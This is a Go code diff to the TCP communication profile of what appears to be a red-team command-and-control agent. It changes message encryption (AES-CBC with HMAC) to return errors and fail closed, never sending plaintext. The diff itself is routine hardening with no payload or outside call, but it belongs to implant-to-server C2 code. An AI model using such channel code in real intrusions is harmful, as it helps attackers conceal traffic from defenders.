@@ -121,7 +121,10 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 
 	// Encrypt if key provided
 	if t.EncryptionKey != "" {
-		body = t.encryptMessage(body)
+		body, err = t.encryptMessage(body)
+		if err != nil {
+			return fmt.Errorf("encryption failed: %w", err)
+		}
 	}
 
 	// Frame: UUID + encrypted body
@@ -224,7 +227,10 @@ done:
 	}
 
 	if t.EncryptionKey != "" {
-		body = t.encryptMessage(body)
+		body, err = t.encryptMessage(body)
+		if err != nil {
+			return nil, nil, fmt.Errorf("encryption failed: %w", err)
+		}
 	}
 
 	activeUUID := t.getActiveUUID(agent)
@@ -346,7 +352,10 @@ doneEdges:
 	}
 
 	if t.EncryptionKey != "" {
-		body = t.encryptMessage(body)
+		body, err = t.encryptMessage(body)
+		if err != nil {
+			return nil, fmt.Errorf("encryption failed: %w", err)
+		}
 	}
 
 	activeUUID := t.getActiveUUID(agent)
@@ -785,24 +794,26 @@ func (t *TCPProfile) recvTCP(conn net.Conn) ([]byte, error) {
 
 // --- Encryption (same as HTTP profile) ---
 
-func (t *TCPProfile) encryptMessage(msg []byte) []byte {
+// encryptMessage encrypts a message using AES-CBC with HMAC (Freyja format).
+// Returns an error if encryption fails — never falls back to plaintext to avoid leaking unencrypted data.
+func (t *TCPProfile) encryptMessage(msg []byte) ([]byte, error) {
 	if t.EncryptionKey == "" {
-		return msg
+		return msg, nil
 	}
 
 	key, err := base64.StdEncoding.DecodeString(t.EncryptionKey)
 	if err != nil {
-		return msg
+		return nil, fmt.Errorf("failed to decode encryption key: %w", err)
 	}
 
 	block, err := aes.NewCipher(key)
 	if err != nil {
-		return msg
+		return nil, fmt.Errorf("failed to create AES cipher: %w", err)
 	}
 
 	iv := make([]byte, aes.BlockSize)
 	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		return msg
+		return nil, fmt.Errorf("failed to generate IV: %w", err)
 	}
 
 	mode := cipher.NewCBCEncrypter(block, iv)
@@ -816,7 +827,7 @@ func (t *TCPProfile) encryptMessage(msg []byte) []byte {
 	mac.Write(ivCiphertext)
 	hmacBytes := mac.Sum(nil)
 
-	return append(ivCiphertext, hmacBytes...)
+	return append(ivCiphertext, hmacBytes...), nil
 }
 
 func (t *TCPProfile) decryptResponse(encryptedData []byte) ([]byte, error) {
